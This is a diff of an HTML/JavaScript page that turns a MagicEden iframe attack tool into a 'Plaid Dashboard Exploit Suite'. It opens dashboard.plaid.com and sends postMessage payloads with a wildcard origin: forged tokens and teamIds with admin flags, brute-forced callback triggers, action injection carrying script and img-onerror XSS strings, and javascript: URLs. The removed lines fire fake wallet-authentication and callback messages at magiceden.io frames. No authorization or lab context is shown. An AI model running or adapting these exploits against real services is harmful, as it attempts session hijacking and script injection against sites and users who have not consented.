@@ -2,42 +2,57 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>MagicEden Iframe Analysis</title>
+    <title>Plaid Dashboard Security Test</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 1400px;
+            max-width: 1200px;
             margin: 20px auto;
             padding: 20px;
-            background: #f5f5f5;
+            background: #1a1a2e;
+            color: #eee;
         }
         
-        h1 { color: #333; }
+        h1 {
+            color: #00d9ff;
+            border-bottom: 3px solid #00d9ff;
+            padding-bottom: 10px;
+        }
         
-        .info-box {
-            background: #d1ecf1;
-            border-left: 4px solid #0c5460;
+        .critical {
+            background: #ff4444;
+            color: white;
             padding: 15px;
             margin: 20px 0;
+            border-radius: 8px;
+            font-weight: bold;
         }
         
-        .findings {
-            background: #fff3cd;
-            border-left: 4px solid #856404;
-            padding: 15px;
-            margin: 20px 0;
-        }
-        
-        .test-section {
-            background: white;
+        .test-box {
+            background: #16213e;
             padding: 20px;
             margin: 15px 0;
             border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            border-left: 4px solid #00d9ff;
+        }
+        
+        .test-box h3 {
+            color: #00d9ff;
+            margin-top: 0;
+        }
+        
+        .code {
+            background: #0f3460;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            margin: 10px 0;
+            color: #4ade80;
         }
         
         button {
-            background: #dc3545;
+            background: #ff4444;
             color: white;
             border: none;
             padding: 12px 24px;
@@ -49,28 +64,15 @@
         }
         
         button:hover {
-            background: #c82333;
+            background: #cc0000;
         }
         
-        button.info {
-            background: #17a2b8;
-        }
-        
-        button.info:hover {
-            background: #138496;
-        }
-        
-        #iframe-list {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 10px 0;
-            font-family: monospace;
-            font-size: 13px;
+        button.safe {
+            background: #28a745;
         }
         
         #log {
-            background: #1e1e1e;
+            background: #000;
             color: #0f0;
             padding: 15px;
             border-radius: 5px;
@@ -79,59 +81,73 @@
             height: 500px;
             overflow-y: auto;
             margin-top: 20px;
+            border: 2px solid #00d9ff;
         }
         
         .received { color: #4ade80; font-weight: bold; }
         .sent { color: #60a5fa; }
-        .error { color: #f87171; font-weight: bold; }
+        .critical-log { color: #ff4444; font-weight: bold; }
         .warning { color: #fbbf24; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>🔍 MagicEden Iframe & Window Analysis</h1>
+    <h1>🎯 Plaid Dashboard Exploit Suite</h1>
     
-    <div class="info-box">
-        <strong>Strategy:</strong> The vulnerable listeners might be in iframes, not the main window.<br>
-        Let's enumerate all frames and try to message them directly.
+    <div class="critical">
+        ⚠️ CRITICAL: Handler #4 accepts token & teamId with no visible origin check!<br>
+        Potential session hijacking / authentication bypass vector
     </div>
     
-    <div class="findings">
-        <strong>Known Vulnerable Frames:</strong><br>
-        • auth.magiceden.io (has WAAS listeners)<br>
-        • Wallet connect iframes<br>
-        • Other embedded contexts
+    <div class="test-box">
+        <h3>Exploit 1: Token & TeamId Injection (Handler #4)</h3>
+        <div class="code">
+            Target: N1=>{const L1=N1.data;L1.token&&L1.teamId&&o1(L1.token,L1.teamId)}<br>
+            Attack: Send {token: "attacker_token", teamId: "attacker_team"}
+        </div>
+        <button onclick="exploit1()">🔥 EXPLOIT TOKEN HANDLER</button>
     </div>
     
-    <div class="test-section">
-        <h3>Step 1: Open MagicEden & Wait</h3>
-        <button onclick="openTarget()" class="info">Open MagicEden</button>
-        <p id="open-status">Not opened yet</p>
+    <div class="test-box">
+        <h3>Exploit 2: Source/Data Callback (Handler #1)</h3>
+        <div class="code">
+            Target: ({source:i1,data:o1})=>{i1===_global$1&&o1===r1&&a1.shift()()}<br>
+            Attack: Bruteforce source/data combinations to trigger callback
+        </div>
+        <button onclick="exploit2()">🔥 EXPLOIT CALLBACK</button>
     </div>
     
-    <div class="test-section">
-        <h3>Step 2: Enumerate All Frames</h3>
-        <button onclick="enumerateFrames()" class="info">List All Iframes</button>
-        <div id="iframe-list">No frames enumerated yet</div>
+    <div class="test-box">
+        <h3>Exploit 3: JSON Action Injection (Handler #12)</h3>
+        <div class="code">
+            Target: handleMessageEvent with multiple actions<br>
+            Actions: UpdateClientId, UpdateCustomizations, UpdatePreset, etc.
+        </div>
+        <button onclick="exploit3()">🔥 EXPLOIT ACTIONS</button>
     </div>
     
-    <div class="test-section">
-        <h3>Step 3: Message All Frames</h3>
-        <button onclick="messageAllFrames()">💣 Message Every Frame</button>
-        <p>Sends test messages to main window + all iframes</p>
+    <div class="test-box">
+        <h3>Exploit 4: Preview Handler (Handler #13)</h3>
+        <div class="code">
+            Target: case"preview:onClickPreset": e1.onClickPreset(T1.payload)<br>
+            Attack: Inject preview actions with malicious payloads
+        </div>
+        <button onclick="exploit4()">🔥 EXPLOIT PREVIEW</button>
     </div>
     
-    <div class="test-section">
-        <h3>Step 4: Targeted Attacks on Specific Frames</h3>
-        <button onclick="attackAuthFrames()">🎯 Attack Auth Frames</button>
-        <button onclick="attackWalletFrames()">💰 Attack Wallet Frames</button>
+    <div class="test-box">
+        <h3>💣 COMBINED ASSAULT</h3>
+        <button onclick="exploitAll()" style="font-size: 18px; padding: 15px 30px;">
+            LAUNCH ALL EXPLOITS
+        </button>
     </div>
     
     <div id="log"></div>
-    <button onclick="clearLog()" style="background: #28a745;">Clear Log</button>
+    <button onclick="clearLog()" class="safe">Clear Log</button>
     
     <script>
-        let targetWindow = null;
-        let frameList = [];
+        const TARGET = 'https://dashboard.plaid.com';
+        const WAIT = 15000;
+        let win = null;
         let msgCount = 0;
         
         function log(msg, type = 'sent') {
@@ -147,195 +163,190 @@
             msgCount = 0;
         }
         
-        // Global message listener
+        // Message listener
         window.addEventListener('message', function(e) {
             msgCount++;
             log('📨 #' + msgCount + ' FROM: ' + e.origin, 'received');
-            log('   ' + JSON.stringify(e.data).substring(0, 150), 'received');
             
             const str = JSON.stringify(e.data);
-            if (str.includes('error')) log('   🚨 ERROR!', 'error');
-            if (str.includes('success') || str.includes('returnValue')) log('   ⚡ CALLBACK!', 'error');
-            if (str.includes('wallet') || str.includes('waas')) log('   💰 WALLET!', 'warning');
+            log('   ' + str.substring(0, 200), 'received');
+            
+            if (str.includes('error') || str.includes('Error')) {
+                log('   🚨 ERROR RESPONSE!', 'critical-log');
+            }
+            if (str.includes('token') || str.includes('auth') || str.includes('session')) {
+                log('   ⚡ AUTH/TOKEN RESPONSE!', 'critical-log');
+            }
+            if (str.includes('success') || str.includes('updated')) {
+                log('   ✅ SUCCESS RESPONSE!', 'critical-log');
+            }
         });
         
-        // Step 1: Open target
-        function openTarget() {
-            log('Opening MagicEden...', 'warning');
-            targetWindow = window.open('https://magiceden.io', 'magiceden');
-            document.getElementById('open-status').textContent = 'Opened! Wait 15 seconds then enumerate frames...';
-            document.getElementById('open-status').style.color = 'green';
+        // Exploit 1: Token & TeamId injection
+        function exploit1() {
+            log('=== EXPLOIT 1: TOKEN INJECTION ===', 'critical-log');
+            win = window.open(TARGET, 'plaid1');
             
             setTimeout(function() {
-                log('✅ Page should be loaded now', 'received');
-                document.getElementById('open-status').textContent = 'Ready! Click "List All Iframes"';
-            }, 15000);
+                log('Injecting token & teamId...');
+                
+                // Direct injection
+                win.postMessage({
+                    token: 'attacker_controlled_token',
+                    teamId: 'attacker_team_id'
+                }, '*');
+                
+                // Try variations
+                win.postMessage({
+                    token: 'HIJACKED_SESSION',
+                    teamId: 'team_123',
+                    admin: true
+                }, '*');
+                
+                win.postMessage({
+                    token: 'fake_jwt_token_here',
+                    teamId: 'production_team',
+                    elevated: true
+                }, '*');
+                
+                log('✅ Token injection complete', 'warning');
+            }, WAIT);
         }
         
-        // Step 2: Enumerate frames
-        function enumerateFrames() {
-            if (!targetWindow) {
-                alert('Open MagicEden first!');
-                return;
-            }
+        // Exploit 2: Source/Data callback
+        function exploit2() {
+            log('=== EXPLOIT 2: CALLBACK TRIGGER ===', 'critical-log');
+            win = window.open(TARGET, 'plaid2');
             
-            log('=== ENUMERATING FRAMES ===', 'warning');
-            frameList = [];
-            
-            try {
-                // Try to access frames
-                log('Main window: ' + targetWindow.location.href, 'received');
-                frameList.push({type: 'main', ref: targetWindow, url: targetWindow.location.href});
-            } catch(e) {
-                log('Main window (cross-origin, cannot access URL)', 'received');
-                frameList.push({type: 'main', ref: targetWindow, url: 'cross-origin'});
-            }
-            
-            // Try to enumerate iframes
-            try {
-                const frames = targetWindow.frames;
-                log('Found ' + frames.length + ' frames', 'received');
+            setTimeout(function() {
+                log('Bruteforcing source/data patterns...');
                 
-                for (let i = 0; i < frames.length; i++) {
-                    try {
-                        const url = frames[i].location.href;
-                        log('  Frame ' + i + ': ' + url, 'received');
-                        frameList.push({type: 'iframe', index: i, ref: frames[i], url: url});
-                    } catch(e) {
-                        log('  Frame ' + i + ': (cross-origin)', 'received');
-                        frameList.push({type: 'iframe', index: i, ref: frames[i], url: 'cross-origin'});
-                    }
-                }
-            } catch(e) {
-                log('Cannot enumerate frames: ' + e.message, 'error');
-            }
-            
-            // Update display
-            let html = 'Found ' + frameList.length + ' targets:<br>';
-            frameList.forEach(function(f, i) {
-                html += (i + 1) + '. ' + f.type + ' - ' + f.url + '<br>';
-            });
-            document.getElementById('iframe-list').innerHTML = html;
-            
-            log('✅ Enumeration complete: ' + frameList.length + ' targets', 'received');
+                const sources = ['_global$1', 'global', 'window', 'plaid', 'dashboard', 'source'];
+                const dataVals = ['r1', 'data', 'ready', 'init', true, 1];
+                
+                sources.forEach(function(s) {
+                    dataVals.forEach(function(d) {
+                        win.postMessage({source: s, data: d}, '*');
+                    });
+                });
+                
+                log('Sent ' + (sources.length * dataVals.length) + ' combinations');
+            }, WAIT);
         }
         
-        // Step 3: Message all frames
-        function messageAllFrames() {
-            if (frameList.length === 0) {
-                alert('Enumerate frames first!');
-                return;
-            }
+        // Exploit 3: JSON Action injection
+        function exploit3() {
+            log('=== EXPLOIT 3: ACTION INJECTION ===', 'critical-log');
+            win = window.open(TARGET, 'plaid3');
             
-            log('=== MESSAGING ALL FRAMES ===', 'warning');
-            
-            const testMessages = [
-                {test: 'hello', from: 'attacker'},
-                {id: '1', data: 'test'},
-                {source: 'K', data: 'r'},
-                {waasCall: {command: 'test'}},
-                {origin: 'host', type: 'test'},
-                'iframe-ready-test'
-            ];
-            
-            frameList.forEach(function(frame, idx) {
-                log('Messaging target ' + (idx + 1) + ' (' + frame.type + ')...');
+            setTimeout(function() {
+                log('Injecting malicious actions...');
                 
-                testMessages.forEach(function(msg) {
-                    try {
-                        frame.ref.postMessage(msg, '*');
-                    } catch(e) {
-                        log('  Error: ' + e.message, 'error');
+                const actions = [
+                    'UpdateClientId',
+                    'UpdateCustomizations', 
+                    'UpdatePreset',
+                    'UpdateDisplayedPresets',
+                    'UpdateProducts',
+                    'UpdateCobrandingConfig',
+                    'UpdateLocale',
+                    'UpdatePreviewMode',
+                    'UpdateError'
+                ];
+                
+                actions.forEach(function(action) {
+                    const payload = JSON.stringify({
+                        action: action,
+                        payload: {
+                            clientId: 'attacker_client',
+                            malicious: true,
+                            xss: '<script>alert(document.domain)<script>'
+                        }
+                    });
+                    
+                    win.postMessage(payload, '*');
+                    log('  Sent: ' + action);
+                });
+                
+                log('✅ Action injection complete');
+            }, WAIT);
+        }
+        
+        // Exploit 4: Preview handler
+        function exploit4() {
+            log('=== EXPLOIT 4: PREVIEW EXPLOIT ===', 'critical-log');
+            win = window.open(TARGET, 'plaid4');
+            
+            setTimeout(function() {
+                log('Exploiting preview handler...');
+                
+                const payload1 = JSON.stringify({
+                    action: 'preview:onClickPreset',
+                    payload: {
+                        preset: 'malicious_preset',
+                        execute: 'alert(1)',
+                        url: 'javascript:alert(document.domain)'
                     }
                 });
-            });
-            
-            log('✅ Sent ' + (testMessages.length * frameList.length) + ' messages', 'received');
+                
+                win.postMessage(payload1, '*');
+                
+                const payload2 = JSON.stringify({
+                    action: 'preview:onClickPreset',
+                    payload: '<img src=x onerror=alert(1)>'
+                });
+                
+                win.postMessage(payload2, '*');
+                
+                log('✅ Preview exploit complete');
+            }, WAIT);
         }
         
-        // Step 4a: Attack auth frames
-        function attackAuthFrames() {
-            if (frameList.length === 0) {
-                alert('Enumerate frames first!');
-                return;
-            }
+        // Combined assault
+        function exploitAll() {
+            log('=== 💣 COMBINED ASSAULT ===', 'critical-log');
+            win = window.open(TARGET, 'plaid_combined');
             
-            log('=== ATTACKING AUTH FRAMES ===', 'error');
-            
-            frameList.forEach(function(frame, idx) {
-                if (frame.url.includes('auth') || frame.url === 'cross-origin') {
-                    log('Attacking target ' + (idx + 1) + '...');
-                    
-                    // WAAS patterns
-                    frame.ref.postMessage({
-                        waasCall: {
-                            command: 'authenticate',
-                            parameter: {user: 'attacker'},
-                            version: '1.0',
-                            callId: 'hijack123'
-                        }
-                    }, '*');
-                    
-                    frame.ref.postMessage({
-                        waasReturn: {
-                            returnValue: {token: 'FAKE'},
-                            success: true,
-                            callId: '1'
-                        }
-                    }, '*');
-                    
-                    // Origin bypass
-                    frame.ref.postMessage({
-                        origin: 'host',
-                        type: 'command',
-                        data: 'malicious'
-                    }, '*');
-                    
-                    log('  Sent WAAS/auth messages');
-                }
-            });
-            
-            log('✅ Auth attack complete', 'received');
+            setTimeout(function() {
+                log('LAUNCHING ALL EXPLOITS...', 'critical-log');
+                
+                // Token injection
+                win.postMessage({
+                    token: 'ATTACKER_TOKEN',
+                    teamId: 'ATTACKER_TEAM'
+                }, '*');
+                
+                // Source/data
+                win.postMessage({source: '_global$1', data: 'r1'}, '*');
+                win.postMessage({source: 'global', data: 'ready'}, '*');
+                
+                // Actions
+                const actions = [
+                    'UpdateClientId',
+                    'UpdateCustomizations',
+                    'UpdatePreset'
+                ];
+                
+                actions.forEach(function(a) {
+                    win.postMessage(JSON.stringify({
+                        action: a,
+                        payload: {malicious: true}
+                    }), '*');
+                });
+                
+                // Preview
+                win.postMessage(JSON.stringify({
+                    action: 'preview:onClickPreset',
+                    payload: 'MALICIOUS'
+                }), '*');
+                
+                log('🔥 ASSAULT COMPLETE - 10+ exploits sent', 'critical-log');
+            }, WAIT);
         }
         
-        // Step 4b: Attack wallet frames
-        function attackWalletFrames() {
-            if (frameList.length === 0) {
-                alert('Enumerate frames first!');
-                return;
-            }
-            
-            log('=== ATTACKING WALLET FRAMES ===', 'error');
-            
-            frameList.forEach(function(frame, idx) {
-                log('Attacking target ' + (idx + 1) + '...');
-                
-                // Callback injection
-                for (let i = 0; i < 50; i++) {
-                    frame.ref.postMessage({
-                        id: i,
-                        returnValue: 'HIJACKED',
-                        success: true,
-                        wallet: 'attacker'
-                    }, '*');
-                }
-                
-                // Source/data pattern
-                frame.ref.postMessage({source: 'K', data: 'r'}, '*');
-                frame.ref.postMessage({source: 'W', data: 'r'}, '*');
-                frame.ref.postMessage({source: 'eV', data: 'r'}, '*');
-                
-                log('  Sent 50+ wallet messages');
-            });
-            
-            log('✅ Wallet attack complete', 'received');
-        }
-        
-        log('🎯 Iframe Analysis Suite Ready');
-        log('STEP 1: Click "Open MagicEden"');
-        log('STEP 2: Wait 15 seconds');
-        log('STEP 3: Click "List All Iframes"');
-        log('STEP 4: Click attack buttons');
+        log('💀 Plaid Exploit Suite Ready', 'critical-log');
+        log('Target: ' + TARGET, 'warning');
+        log('Click exploit buttons to test', 'warning');
     </script>
 </body>
 </html>
